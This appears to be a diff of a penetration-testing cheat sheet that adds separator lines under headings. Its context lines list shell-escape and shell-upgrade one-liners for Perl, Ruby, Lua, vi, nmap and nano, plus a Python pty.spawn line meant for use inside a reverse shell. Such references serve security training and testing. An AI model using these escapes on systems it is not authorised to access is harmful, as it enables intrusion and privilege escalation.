@@ -6,38 +6,46 @@
 
 
 #### Perl
+-----
 ```perl -e 'exec "/bin/sh";'```
 
 ```exec "/bin/sh"```
 
 
 #### Ruby
+-----
 ```exec "/bin/sh"```
 
 
 #### LUA
+-----
 ```os.execute("/bin/sh")```
 
 
 #### sh
+-----
 ```/bin/sh -i```
 
 
 #### Vi
+-----
 ```:!bash```
 
 ```:set shell=/bin/bash:shell```
 
 
 #### nmap
+-----
 ```!sh```
 
 
 #### nano
+-----
 ```ctrl+r ctrl+x /bin/bash```
 
 
 #### stty (fixed)
+-----
 *In reverse shell:*
 
 ```python -c 'import pty;pty.spawn("/bin/bash")'```
@@ -58,6 +66,7 @@
 
 
 #### expect
+-----
 *cat sh.exp*
 
 ```#!/usr/bin/expect```
